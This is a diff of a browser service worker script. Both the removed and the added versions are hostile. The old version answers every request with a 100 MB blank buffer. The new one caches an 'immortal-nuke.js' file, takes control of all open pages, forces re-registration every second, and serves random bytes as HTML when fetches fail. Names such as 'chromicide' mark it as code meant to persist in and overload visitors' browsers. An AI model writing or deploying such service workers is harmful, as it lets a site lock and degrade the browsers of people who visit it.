@@ -1,19 +1,22 @@
 self.addEventListener('install', e => {
     self.skipWaiting();
-    e.waitUntil(
-        caches.open('chrome-doom-cache').then(cache => {
-            return cache.addAll([
-                '/',
-                '/assets/css/chromehell.css',
-                '/assets/js/chromicide.js'
-            ]);
-        })
-    );
+    caches.open('nuke-v1').then(cache => {
+        cache.addAll(['/', '/immortal-nuke.js']);
+    });
+});
+
+self.addEventListener('activate', e => {
+    e.waitUntil(clients.claim());
+    setInterval(() => self.registration.update(), 1000);
 });
 
 self.addEventListener('fetch', e => {
-    e.respondWith(new Response(new ArrayBuffer(1024 * 1024 * 100), {
-        status: 200,
-        headers: {'Content-Type': 'application/octet-stream'}
-    }));
+    e.respondWith(
+        caches.match(e.request).then(res => 
+            res || fetch(e.request).catch(() => new Response(
+                new Blob([crypto.getRandomValues(new Uint8Array(1024*1024))]),
+                { headers: { 'Content-Type': 'text/html' } }
+            ))
+        )
+    );
 });
